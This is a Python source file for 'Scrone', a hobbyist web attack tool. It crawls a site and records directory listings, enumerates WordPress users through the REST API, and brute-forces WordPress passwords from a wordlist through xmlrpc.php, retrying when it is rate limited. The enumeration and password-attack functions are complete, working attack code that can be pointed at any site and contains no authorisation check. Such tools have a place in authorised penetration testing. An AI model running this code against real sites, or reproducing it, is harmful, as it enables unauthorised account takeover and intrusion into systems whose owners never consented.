import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import argparse
import xml.etree.ElementTree as ET
import time

##########################
#
#   ██████  ▄████▄   ██▀███   ▒█████   ███▄    █ ▓█████ 
# ▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ ▓█   ▀ 
# ░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒▒███   
#   ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄ 
# ▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░░▒████▒
# ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░
# ░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░
# ░  ░  ░  ░          ░░   ░ ░ ░ ░ ▒     ░   ░ ░    ░   
#       ░  ░ ░         ░         ░ ░           ░    ░  ░
#          ░                                           
# Author: gerbil.
# Version: 0.2
# Date: 16/05/2024
#
# Previous releases:
# 15/05/2024 : v0.1
#
# Twenty plus years after initial discussion, Scrone has been made!
# This is a simple python3 script created to crawl and evaluate websites.
#
# Features included are:
#
# * Crawl: Searches for and crawls links on the page.
#   NOTE: This is a bit buggy, but not dangerous, and is being worked on.

# * Deep crawl: As well as crawling links, href links, this will also crawl other
#   tags found on the website, such as js scripts and also their sub folders.
#   All found and ignored (out of domain) locations are stored in respective
#   files.
#   NOTE: This is a bit buggy, but not dangerous, and is being worked on.
#
# * "Index of" search: Pages with directory listing enabled will be found
#   and location recorded. Any that are "Forbidden" will also be recorded.
# 
# * WordPress User Enumeration: An attempt will be used to enumerate WordPress
#   users of the site.
# 
# * WordPress Password bruteforcer: Attempts to crack passwords using a given 
#   wordfile.
#   NOTE: This is currently slow, and will only attempt one retry when the
#   'rate limit' has been hit. Also, xmlrpc needs to be enabled for attack to work. 
# 
# This is completely PoC stuff, so use at your own risk.
# Also, the features in this program are all basic where the script assumes
# certain features (such as xml.rpc.php) are in certain places etc. These 
# will eventually be automated.
#
# TODO/Future features will include:
#
# * Silent/verbose options.
# * Multithreading to speed up crawling.
# * Timestamped output files with URL included.
# * Include an "ignore" so that certian files will be ignored. Currently, 
#   "image files" (.jpg, .jpeg, .png, .gif, .bmp) are ignored but hardcoded - 
#   this will soon be an optional feature.
# * Alternative password cracking method - currently I have only implemented
#   the 'xmlrpc' method. It would be good to include another routine such as 
#   using the actuall login page. but that would be well slower.
# * Check if xmlrpc is enabled.
# * Audit xmlrpc allowed methods.
# * WordPress Plugin and Themes enumeration
# * ...and WordPress version number checks
# * And other things not associated with WordPress! Other CMSs  
# * ...and other stuff that I can't think of right now!
#
# -gerb. 

def banner():
    print("\n .▄▄ ·  ▄▄· ▄▄▄         ▐ ▄ ▄▄▄ .")
    print(" ▐█ ▀. ▐█ ▌▪▀▄ █·▪     •█▌▐█▀▄.▀·")
    print(" ▄▀▀▀█▄██ ▄▄▐▀▀▄  ▄█▀▄ ▐█▐▐▌▐▀▀▪▄")
    print(" ▐█▄▪▐█▐███▌▐█•█▌▐█▌.▐▌██▐█▌▐█▄▄▌")
    print("  ▀▀▀▀ ·▀▀▀ .▀  ▀ ▀█▄▀▪▀▀ █▪ ▀▀▀     ")
    print(f" Version {version}     by gerbil. 2024 \n")


def wp_user_enum(url):
    url = url+"/wp-json/wp/v2/users/"
    print("Attempting WordPress user enumeration...")
    response = requests.get(url)
    if response.status_code == 200:
        users = response.json()
        if users:
            print("Found users:")
            for user in users:
                print(f"ID: {user['id']}")
                print(f"Name: {user['name']}")
                print(f"Slug: {user['slug']}")
                print(f"URL: {user['url']}")
                print(f"Link: {user['link']}")
                print(f"Desc: {user['description']}")                
                print("-----------")
        else:
            print("Users could not be enumerated.")
    else:
        print("Users could not be enumerated.")

def wp_password_attack(url, username, wordfile):
    url = url+"/xmlrpc.php"
    print(f"Attacking WordPress user {username} with wordfile {wordfile}.")
    print("This is likely to take bloody ages, so please be patient...")
    headers = {'Content-Type': 'application/xml'}
    retryFlag=False
    retryWait=2
    
    with open(wordfile, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.rstrip('\n')
#        print("Checking password["+password+"]") 
        
        # Build the XML structure
        method_call = ET.Element('methodCall')
        method_name = ET.SubElement(method_call, 'methodName')
        method_name.text = 'wp.getUsersBlogs'
        
        params = ET.SubElement(method_call, 'params')
        
        param1 = ET.SubElement(params, 'param')
        value1 = ET.SubElement(param1, 'value')
        value1.text = username
        
        param2 = ET.SubElement(params, 'param')
        value2 = ET.SubElement(param2, 'value')
        value2.text = password
        
        # Convert the XML structure to a string
        data = ET.tostring(method_call, encoding='unicode')
        
        response = requests.post(url, headers=headers, data=data)
        response_content = response.content.decode('utf-8')

        if 'faultString' not in response_content:
#            print(f"bad: {len(response_content)}")
            if 'rate limited' in response_content.lower():
                print("RATE LIMITED! ")
                print(f"\t\t{response_content}")
                print(f"Waiting {retryWait} seconds...")
                retryFlag=True
                time.sleep(retryWait)
#                break
            else:
                print(f"FOUND! Username=\"{username}\" Password=\"{password}\"")
                return 0  # Stop on first valid password

        if retryFlag:
            print(f"Restarting with \"{password}\"...")
            retryFlag=False
            response = requests.post(url, headers=headers, data=data)
            response_content = response.content.decode('utf-8')
            if 'faultString' not in response_content:
    #            print(f"bad: {len(response_content)}")
                if 'rate limited' in response_content.lower():
                    print("STILL RATE LIMITED!!!")
                    print(f"\t\t{response_content}")
                    print("Quitting.")
                    return 1
                else:
                    print(f"FOUND! Username=\"{username}\" Password=\"{password}\"")
                    return 0  # Stop on first valid password
    print("Wordlist exhausted - no valid password was found. :O(")
             
#        # Wait for 1.5 seconds before trying the next password
#        time.sleep(1)


def get_links(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    links = set()
        
    # Find all href and src attributes
    for tag in soup.find_all(['a', 'img', 'link', 'script']):
        # crawl (just hrefs):
        if 'href' in tag.attrs:
            sub = tag['href']
            # Convert relative URLs to absolute URLs
            full_url = get_absolute_url(url, sub)
            links.add(full_url)
            # deepcrawl (...and the rest):
            if args.deepcrawl:
                while '/' in sub:
                    sub = sub.rsplit('/', 1)[0]
                    if '//' in sub:
                        links.add(get_absolute_url(url, sub))
        if 'src' in tag.attrs:
            sub = tag['src']
            # Convert relative URLs to absolute URLs
            full_url = get_absolute_url(url, sub)
            links.add(full_url)
            # deepcrawl (...and the rest):
            if args.deepcrawl:
                while '/' in sub:
                    sub = sub.rsplit('/', 1)[0]
                    if '//' in sub:
                        links.add(get_absolute_url(url, sub))
    return links

def clean_link(link):
    # Truncate any # or ? characters along with following characters
    return link.split('#')[0].split('?')[0]

def get_absolute_url(base_url, relative_url):
    return urljoin(base_url, relative_url)

def is_image(link):
    # Check if link ends with common image extensions. TODO: Store saucy images in a folder called "pervy". Also make file extensions optional.
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp']
    return any(link.lower().endswith(ext) for ext in image_extensions)

def is_subdomain(domain, base_domain):
    return domain == base_domain or domain.endswith('.' + base_domain)

def crawl_website(url, visited=set(), ignored=set(), indexes=set(), forbidden=set(), base_domain=None, depth=0, max_depth=5):
    if depth > max_depth:
        return

    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')

        # Check if the title contains "Index of" or "Forbidden
        if args.indexes:
            if soup.title and soup.title.string and "Index of" in soup.title.string:
                indexes.add(url)
                print('INDEX: ' + url)
            if soup.title and soup.title.string and "Forbidden" in soup.title.string:
                forbidden.add(url)
                print('FORBIDDEN INDEX: ' + url)
    except requests.RequestException as e:
        print(f"Failed to access {url}: {e}")
        return

    # Get links from the current page
    links = get_links(url)
    
    for link in links:
        # Clean the link
        cleaned_link = clean_link(link)
        
        # Check if it's an absolute URL and if it's within the given domain or subdomain
        parsed_url = urlparse(cleaned_link)
        if is_subdomain(parsed_url.netloc, base_domain):
            # If it's not already visited and not an image
            if cleaned_link not in visited and not is_image(cleaned_link):
                print("Visiting: " + cleaned_link)
                visited.add(cleaned_link)
                # If it's a subfolder, explore it recursively
                crawl_website(cleaned_link, visited, ignored, indexes, forbidden, base_domain, depth + 1, max_depth)
        else:
            # If it's outside the given domain, add it to ignored set if not already added
            if cleaned_link not in ignored:
                print("Ignoring: " + cleaned_link)
                ignored.add(cleaned_link)

# Main function
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Scrone')
    parser.add_argument('-U', '--url', required=True, help='The host URL.')
    parser.add_argument('-d', '--depth', type=int, default=5, help='The maximum depth to crawl (default is 5).')
    parser.add_argument('-c', '--crawl', action='store_true', help='BETA: Crawls a given website, just the hrefs.')
    parser.add_argument('-C', '--deepcrawl', action='store_true', help='BETA: Crawls a given website, every link found.')
    parser.add_argument('-i', '--indexes', action='store_true', help='Stores any "Index of..." files that are found during a crawl. Must be used with (-c, --crawl) parameter.')
    parser.add_argument( '--wp-user-enum', action='store_true', help='BETA: Attempts and enumeration of WordPress users.')
    parser.add_argument('-u', '--wp-username', type=str, help='Currently accepts a single WordPress user for password auditing.')
    parser.add_argument('-w', '--wp-wordlist', type=str, help='Requires the location of a wordlist (password file).')
    parser.add_argument('-p', '--wp-password-attack', action='store_true', help='Attempts a dictionary attack on a currently single user.')
    
    args = parser.parse_args()

    start_url = args.url
    base_domain = urlparse(start_url).netloc
    max_depth = args.depth
    visited_file = 'visited.txt'
    ignored_file = 'ignored.txt'
    indexes_file = 'indexes.txt'
    forbidden_file = 'forbidden.txt'
    WPusername = args.wp_username
    WPwordlistFile = args.wp_wordlist   
    version = "0.2 " # keep to 4 chars wide to keep banner intact  
    
    visited = set()
    ignored = set()
    indexes = set()
    forbidden = set()
    
    banner()

    if args.wp_user_enum:
        wp_user_enum(start_url)
        
    if args.wp_password_attack:
        if not WPusername and not WPwordlistFile:
            print("--wp-password-attack requires a user (-u,--wp-username) and a wordlist (-w,--wp-wordlist)\nNow try again, and this time do it right! :O)")
            exit(1)
        wp_password_attack(start_url, WPusername, WPwordlistFile)

    if args.crawl or args.deepcrawl:
        if args.crawl:
            print(f"Crawling {start_url} with max depth of {max_depth}...")
        if args.deepcrawl:
            print(f"Deep Crawling {start_url} with max depth of {max_depth}...")

        crawl_website(start_url, visited, ignored, indexes, forbidden, base_domain, max_depth=max_depth)

        # Write unique visited links to visited.txt
        with open(visited_file, 'w') as f:
            for link in visited:
                f.write(link + '\n')
        
        # Write ignored links to ignored.txt
        with open(ignored_file, 'w') as f:
            for link in ignored:
                f.write(link + '\n')
        
        # Print indexes and forbiddens if the --indexes flag is set
        if args.indexes:
            print("Index links found:")
            if indexes:
                with open(indexes_file, 'w') as f:
                    for link in indexes:
                        f.write(link + '\n')
                        print(link)
            print("Forbidden index links found:")
            if forbidden:
                with open(forbidden_file, 'w') as f:
                    for link in forbidden:
                        f.write(link + '\n')
                        print(link)

